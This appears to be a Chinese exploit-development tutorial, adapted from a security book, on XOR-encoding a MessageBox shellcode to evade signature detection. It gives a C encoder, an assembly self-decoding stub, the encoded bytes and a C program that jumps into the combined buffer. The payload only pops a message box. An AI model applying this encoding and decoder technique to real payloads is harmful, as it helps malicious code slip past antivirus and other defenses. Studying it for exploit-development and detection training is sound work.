我们写的shellcode容易通过一些特征码被检测到，所以要变形一下，也可以说是加密

我从0Day安全这本书上抄了下这段代码，实现了对shellcode的加密，一起来看下实现过程


```c
#include <stdio.h>
#include <malloc.h>
#include <string.h> 
#include <stdlib.h> 

char popup_general[169] = {//上次实验弹框的shellcode
    0xFC, 0x68, 0x6A, 0x0A, 0x38, 0x1E, 0x68, 0x63,
    0x89, 0xD1, 0x4F, 0x68, 0x32, 0x74, 0x91, 0x0C,
    0x8B, 0xF4, 0x8D, 0x7E, 0xF4, 0x33, 0xDB, 0xB7,
    0x04, 0x2B, 0xE3, 0x66, 0xBB, 0x33, 0x32, 0x53,
    0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0x33, 0xD2,
    0x64, 0x8B, 0x5A, 0x30, 0x8B, 0x4B, 0x0C, 0x8B,
    0x49, 0x1C, 0x8B, 0x09, 0x8B, 0x69, 0x08, 0xAD,
    0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0x05, 0x95,
    0xFF, 0x57, 0xF8, 0x95, 0x60, 0x8B, 0x45, 0x3C,
    0x8B, 0x4C, 0x05, 0x78, 0x03, 0xCD, 0x8B, 0x59,
    0x20, 0x03, 0xDD, 0x33, 0xFF, 0x47, 0x8B, 0x34,
    0xBB, 0x03, 0xF5, 0x99, 0x0F, 0xBE, 0x06, 0x3A,
    0xC4, 0x74, 0x08, 0xC1, 0xCA, 0x07, 0x03, 0xD0,
    0x46, 0xEB, 0xF1, 0x3B, 0x54, 0x24, 0x1C, 0x75,
    0xE4, 0x8B, 0x59, 0x24, 0x03, 0xDD, 0x66, 0x8B,
    0x3C, 0x7B, 0x8B, 0x59, 0x1C, 0x03, 0xDD, 0x03,
    0x2C, 0xBB, 0x95, 0x5F, 0xAB, 0x57, 0x61, 0x3D,
    0x6A, 0x0A, 0x38, 0x1E, 0x75, 0xA9, 0x33, 0xDB,
    0x53, 0x68, 0x66, 0x66, 0x66, 0x66, 0x68, 0x66,
    0x66, 0x66, 0x66, 0x8B, 0xC4, 0x53, 0x50, 0x50,
    0x53, 0xFF, 0x57, 0xFC, 0x53, 0xFF, 0x57, 0xF8,
    0x90 
};


void encoder (char* input, unsigned char key, int display_flag)//加密函数
{
	int i=0,len=0;
	FILE * fp;
	unsigned char * output;                   //一个地址
	len = strlen(input);
	output=(unsigned char *)malloc(len+1);    //对地址申请空间
	if(!output)                               //判断空间是否申请成功
	{
		printf("memory erro!\n");
		exit(0);
	}
	for(i=0;i<len;i++)                        //对shellcode进行xor加密
	{
		output[i] = input[i]^key;
	}
	if(!(fp=fopen("encode.txt","w+")))        //判断文件是否成功打开
	{
		printf("output file create erro");
		exit(0);
	}
	fprintf(fp,"\"");                   
	for(i=0;i<len;i++)
	{		
		fprintf(fp,"\\x%0.2x", output[i]);      //将加密的shellcode写入文件
		if((i+1)%16==0)
		{			
			fprintf(fp,"\"\n\"");                 //每行16个
		}
	}
	fprintf(fp,"\";");
	fclose(fp);
	printf("dump the encoded shellcode to encode.txt OK!\n");   //打印
	if(display_flag)
	{
		for(i=0;i<len;i++)
		{
			printf("%0.2x ",output[i]);       //将加密的shellcode打印到控制台上
			if((i+1)%16==0)
			{
				printf("\n");
			}
		}
	}
	free(output);       //对内存的释放
}
void main()
{
	encoder(popup_general,0x44 ,1);
	getchar();
}

```


上面的函数其实就是对shellcode进行xor加密，然后存盘。这里注意shellcode加密时xor的密钥流不能与shellcode存在相同字节，要不然会出现0，比如20^20=0，这样子就被截断了

现在加密后shellcode，程序是无法识别的，所以我们要在运行这段shellcode之前对shellcode进行解密，因此我们还需要一个解密器

```asm
void main()
{
	__asm int 3
	__asm
	{
			nop
			nop
			nop
			nop
			nop
			nop
			pop eax             
			add eax, 0x14       //跳过解密器   
			xor ecx,ecx
decode_loop:
			mov bl,[eax+ecx]    //加密的shellcode逐字节解密
			xor bl, 0x44        //xor 0x44
			mov [eax+ecx],bl    //解密完放回原来的地方
			
			inc ecx             //shellcode下一个字节
			cmp bl,0x90         //比较是否到0x90，因为我们shellcode最后一个字节就是0x90，代表解密完成
			jne decode_loop     //一个循环
			nop
			nop
			nop
			nop
			nop
	}
}
```

我们需要把解密器放在shellcode前面，将解密器与shellcode拼接起来

![](https://raw.githubusercontent.com/Whitebird0/tuchuang/main/WX20220404-165946@2x.png)

获取解密器的字节码

     83 C0 14 33 C9 8A 1C 08 80 F3 44 88 1C 08 41 80 FB 90 75 F1


密文

```
"\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48"
"\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17"
"\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf"
"\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1"
"\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d"
"\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e"
"\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31"
"\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47"
"\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f"
"\x17\x2c\x22\x22\x22\x22\x2c\x22\x22\x22\x22\xcf\x80\x17\x14\x14"
"\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4";
```

通过010editor拼接一下

![](https://raw.githubusercontent.com/Whitebird0/tuchuang/main/WX20220404-171414@2x.png)

现在已经是一段能够自解密的shellcode了，调用一下

```asm

unsigned char hexData[190] = {
    0x83, 0xC0, 0x14, 0x33, 0xC9, 0x8A, 0x1C,
    0x08, 0x80, 0xF3, 0x44, 0x88, 0x1C, 0x08, 0x41,
    0x80, 0xFB, 0x90, 0x75, 0xF1, 0xB8, 0x2C, 0x2E,
    0x4E, 0x7C, 0x5A, 0x2C, 0x27, 0xCD, 0x95, 0x0B,
    0x2C, 0x76, 0x30, 0xD5, 0x48, 0xCF, 0xB0, 0xC9,
    0x3A, 0xB0, 0x77, 0x9F, 0xF3, 0x40, 0x6F, 0xA7,
    0x22, 0xFF, 0x77, 0x76, 0x17, 0x2C, 0x31, 0x37,
    0x21, 0x36, 0x10, 0x77, 0x96, 0x20, 0xCF, 0x1E,
    0x74, 0xCF, 0x0F, 0x48, 0xCF, 0x0D, 0x58, 0xCF,
    0x4D, 0xCF, 0x2D, 0x4C, 0xE9, 0x79, 0x2E, 0x4E,
    0x7C, 0x5A, 0x31, 0x41, 0xD1, 0xBB, 0x13, 0xBC,
    0xD1, 0x24, 0xCF, 0x01, 0x78, 0xCF, 0x08, 0x41,
    0x3C, 0x47, 0x89, 0xCF, 0x1D, 0x64, 0x47, 0x99,
    0x77, 0xBB, 0x03, 0xCF, 0x70, 0xFF, 0x47, 0xB1,
    0xDD, 0x4B, 0xFA, 0x42, 0x7E, 0x80, 0x30, 0x4C,
    0x85, 0x8E, 0x43, 0x47, 0x94, 0x02, 0xAF, 0xB5,
    0x7F, 0x10, 0x60, 0x58, 0x31, 0xA0, 0xCF, 0x1D,
    0x60, 0x47, 0x99, 0x22, 0xCF, 0x78, 0x3F, 0xCF,
    0x1D, 0x58, 0x47, 0x99, 0x47, 0x68, 0xFF, 0xD1,
    0x1B, 0xEF, 0x13, 0x25, 0x79, 0x2E, 0x4E, 0x7C,
    0x5A, 0x31, 0xED, 0x77, 0x9F, 0x17, 0x2C, 0x22,
    0x22, 0x22, 0x22, 0x2C, 0x22, 0x22, 0x22, 0x22,
    0xCF, 0x80, 0x17, 0x14, 0x14, 0x17, 0xBB, 0x13,
    0xB8, 0x17, 0xBB, 0x13, 0xBC, 0xD4
};

void main(){

	_asm{

		lea eax,hexData
		push eax
		ret
}}
```
